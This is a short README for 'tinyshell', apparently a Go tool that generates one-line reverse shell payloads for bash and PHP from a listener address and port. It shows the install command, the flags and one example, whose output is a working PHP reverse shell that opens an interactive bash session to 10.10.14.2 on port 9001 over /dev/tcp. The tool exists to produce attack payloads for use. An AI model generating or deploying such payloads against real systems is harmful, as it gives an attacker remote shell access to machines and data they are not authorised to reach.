# tinyshell 🐚

A minimalistic command-line tool to quickly generate common reverse shell payloads.

## Description

`tinyshell` simplifies the process of creating one-liner reverse shell payloads. Instead of manually typing or looking up the syntax for different shell types, you can use this tool to generate them by simply providing the listener's IP address, port, and the desired payload type.

-----

## Installation

To install `tinyshell`, you'll need to have [Go](https://go.dev/doc/install) installed.

```bash
go install github.com/OtterWiz/tinyshell@latest
```
-----

## Usage

The tool requires three flags to generate a payload: address, port, and type.

### Flags

| Flag | Alias | Description | Required |
| :--- | :---: | :--- | :---: |
| `--address` | `-a` | The listener's IP address (the address the shell connects back to). | Yes |
| `--port` | `-p` | The listener's port. | Yes |
| `--type` | `-t` | The type of payload to generate. | Yes |

### Supported Payloads (so far...)

  * `bash`
  * `php`

-----

## Examples

### 1\. Generating a PHP Payload
To generate a PHP reverse shell payload that connects to `10.10.14.2` on port `9001`:

To generate a PHP reverse shell payload for the same listener:

**Command:**

```bash
tinyshell -a 10.10.14.2 -p 9001 -t php
```

**Output:**

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'");
```